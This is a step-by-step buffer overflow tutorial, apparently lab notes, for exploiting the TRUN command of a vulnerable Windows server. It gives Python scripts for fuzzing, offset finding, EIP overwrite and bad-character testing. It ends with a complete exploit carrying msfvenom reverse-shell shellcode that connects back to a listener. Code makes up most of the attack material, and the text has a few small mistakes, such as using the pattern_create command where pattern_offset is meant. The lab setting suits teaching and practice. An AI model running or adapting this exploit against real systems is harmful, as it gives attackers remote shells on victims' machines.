Buffer Overflows

############
Make it Easy
############
----


Mona Setup
==========

In Immunity Debugger, type the following to set a working directory for mona.
To create Log Data
> !mona config -set workingfolder c:\mona\%p

Spiking
=======

Spiking is done to figure out what is vulnerable. 
We can use a tool called “generic_send_tcp” to generate TCP connections with the vulnerable application. :
> generic_send_tcp argc=1
Let's Spiking For BOF
Create File "Spiking.spk"
and put This code inside it
```
s_readline();
s_string("TRUN ");
s_string_variable("0");
```

Now Let's To Work With it:
> generic_send_tcp <IP> <PORT> <FILE.spk> 0 0

You Will take 41414141 in Immunity Debugger that's mean "AAAA" and there a vulnerability

Fuzzing
=======

Once we have figured out which command is vulnerable (in this case it is “TRUN” command), 
we need to find approximately at how many bytes the application is crashing.

_fuzzing script_
```
#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
        try:

                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('172.16.70.134',9999))

                s.send(('TRUN /.:/' + buffer))
                s.close
                sleep(1)
                buffer = buffer + "A"*100

        except:
                print "Fuzzing crashed at %s bytes" % str(len(buffer))
                sys.exit()
```

After this script execution, the program crashes, and roughly we know at how many bytes does the program crashed.
>Click "CTRL+C" to See The Bytes


Finding the Offset
==================

Using the above value, we will use the tool “pattern_create.rb“ to generate a pattern for those many bytes.
> msf-pattern_create -l 2100

Copy it And paste it in Python Fil

```
#!/usr/bin/python
import sys, socket

############### finding the offset script ##################
## Generate offset using pattern offset command

offset = "#### HERE ####"

try:

        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.80.1',9999))
        s.send(('TRUN /.:/' + offset))
        s.close


except:
        print "Error connecting to the server"
        sys.exit()
```
After running this script, the program crashed and we got a new EIP,
so we now need to find that this value (386F4337) is exactly where in our pattern, 
it will indicate offset value. For that, we will be using “pattern_offset.rb”

> msf-pattern_create -l 2100 -q 386F4337
[*] Exact match at offset 2003

So we know we need to have 2003 bytes written and then we will start writing to our EIP (Evil Instruction Pointer).


Overwriting the EIP
===================

To test this value, we can use this script:

```
#!/usr/bin/python
import sys, socket

############### OVERITING THE EIP ##################
## this 2003 is the value we find from previos script for exact address.

shellcode = "A" * 2003 + "B" * 4

try:

        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.80.1',9999))

        s.send(('TRUN /.:/' + shellcode))
        s.close


except:
        print "Error connecting to the server"
        sys.exit()
```
After writing 2003 “A”, this script will write 4 “B” & if we see these 4 “B” in EIP, 
we have verified that we can write in EIP. The output from the following script:
> 42424242 "Means 4'B "

Finding the bad characters
==========================

A bad character is essentially a rundown of undesirable characters that can break the shellcodes. There is no universal arrangement of bad characters, as we would presumably be starting to see, yet relying upon the application and the developer logic there is an alternate arrangement of bad characters for each program that we would experience. Thusly, we should discover the bad characters in each application before composing the shellcode.

Some of the very common bad characters are:

* 00 for NULL
* 0A for Line Feed \n
* 0D for Carriage Return \r
* FF for Form Feed \f
 
 > List of bad characters can be easily found on Google. Remember /x00 is always a bad character.
 
 https://www.ins1gn1a.com/identifying-bad-characters/
 
 We will modify our script like this now:
 
 ```
#!/usr/bin/python
import sys, socket

############### Finding the badchars ##################

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
shellcode = "A" * 2003 + "B" * 4 + badchars

try:

        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.80.1',9999))

        s.send(('TRUN /.:/' + shellcode))
        s.close

except:
        print "Error connecting to the server"
        sys.exit()
 ```
 Once we fire this script and program crashes, we need to right-click the ESP and “Follow in DUMP“ 
 and then look at it carefully that what characters looks out of the place.
> check the last VULA in "HEX DUMP"

Finding the right modules
=========================

Now fire up the immunity debugger and in the command line below put the command:
> !mona modules
We need to find something attached to a vulnerable server and everything should be false. (essfunc.dll for example)

We need to use now opcode equivalent to jump the flow to our malicious payload:
can be done using nasm_shell, "msf-nasm_shell"
run it, and type "JMP ESP"
Take the JMP ESP its "FFE4" change it to loot likes "\xff\xe4"
then run mona:
> !mona find -s "\xff\xe4" -m essfunc.dll

We have 9 such pointers in this example, we can choose one of them, I am looking at the very first one which is “625011af”.
We can verify that if it’s a JMP ESP by searching this By press "CTRL+G"

"here press F2 to higtlite it the adderss"

change the "625011af" to \xaf\x11\x50\x62
and put it in python file, like:

```
#!/usr/bin/python
import sys, socket

############### mona jump code "625011AF"##################

shellcode = "A" * 2003 + "\xaf\x11\x50\x62"

try:

        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.80.1',9999))

        s.send(('TRUN /.:/' + shellcode))
        s.close


except:
        print "Error connecting to the server"
        sys.exit()
```
this to if there a Exploitation or not, press in ESP "Follow Dump" to see it

Exploitation
============

Generate payload using MSFvenom & remember to specify all bad characters using -b(\x00 is always bad):
> msfvenom -p windows/shell_reverse_tcp LHOST=192.168.80.1 LPORT=4444 EXITFUNC=thread -b "\x00" -f c

Put this is in your python script:
```
#!/usr/bin/python
import sys, socket

############### EXPLOITATION & FUN ##################
overflow = (
"\xdb\xce\xd9\x74\x24\xf4\x5a\x31\xc9\xb1\x52\xbb\x44\x7d\xca"
"\xdf\x31\x5a\x17\x03\x5a\x17\x83\xae\x81\x28\x2a\xd2\x92\x2f"
"\xd5\x2a\x63\x50\x5f\xcf\x52\x50\x3b\x84\xc5\x60\x4f\xc8\xe9"
"\x0b\x1d\xf8\x7a\x79\x8a\x0f\xca\x34\xec\x3e\xcb\x65\xcc\x21"
"\x4f\x74\x01\x81\x6e\xb7\x54\xc0\xb7\xaa\x95\x90\x60\xa0\x08"
"\x04\x04\xfc\x90\xaf\x56\x10\x91\x4c\x2e\x13\xb0\xc3\x24\x4a"
"\x12\xe2\xe9\xe6\x1b\xfc\xee\xc3\xd2\x77\xc4\xb8\xe4\x51\x14"
"\x40\x4a\x9c\x98\xb3\x92\xd9\x1f\x2c\xe1\x13\x5c\xd1\xf2\xe0"
"\x1e\x0d\x76\xf2\xb9\xc6\x20\xde\x38\x0a\xb6\x95\x37\xe7\xbc"
"\xf1\x5b\xf6\x11\x8a\x60\x73\x94\x5c\xe1\xc7\xb3\x78\xa9\x9c"
"\xda\xd9\x17\x72\xe2\x39\xf8\x2b\x46\x32\x15\x3f\xfb\x19\x72"
"\x8c\x36\xa1\x82\x9a\x41\xd2\xb0\x05\xfa\x7c\xf9\xce\x24\x7b"
"\xfe\xe4\x91\x13\x01\x07\xe2\x3a\xc6\x53\xb2\x54\xef\xdb\x59"
"\xa4\x10\x0e\xcd\xf4\xbe\xe1\xae\xa4\x7e\x52\x47\xae\x70\x8d"
"\x77\xd1\x5a\xa6\x12\x28\x0d\x09\x4a\x62\xcc\xe1\x89\x82\xdf"
"\xad\x04\x64\xb5\x5d\x41\x3f\x22\xc7\xc8\xcb\xd3\x08\xc7\xb6"
"\xd4\x83\xe4\x47\x9a\x63\x80\x5b\x4b\x84\xdf\x01\xda\x9b\xf5"
"\x2d\x80\x0e\x92\xad\xcf\x32\x0d\xfa\x98\x85\x44\x6e\x35\xbf"
"\xfe\x8c\xc4\x59\x38\x14\x13\x9a\xc7\x95\xd6\xa6\xe3\x85\x2e"
"\x26\xa8\xf1\xfe\x71\x66\xaf\xb8\x2b\xc8\x19\x13\x87\x82\xcd"
"\xe2\xeb\x14\x8b\xea\x21\xe3\x73\x5a\x9c\xb2\x8c\x53\x48\x33"
"\xf5\x89\xe8\xbc\x2c\x0a\x08\x5f\xe4\x67\xa1\xc6\x6d\xca\xac"
"\xf8\x58\x09\xc9\x7a\x68\xf2\x2e\x62\x19\xf7\x6b\x24\xf2\x85"
"\xe4\xc1\xf4\x3a\x04\xc0" )
shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

try:

        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.80.1',9999))

        s.send(('TRUN /.:/' + shellcode))
        s.close


except:
        print "Error connecting to the server"
        sys.exit()
```
Put the listenser on the port used in generating the payload 

# We done Here ! Nice Hacking
Resources: https://catharsis.net.au/blog/basic-buffer-overflow-guide/
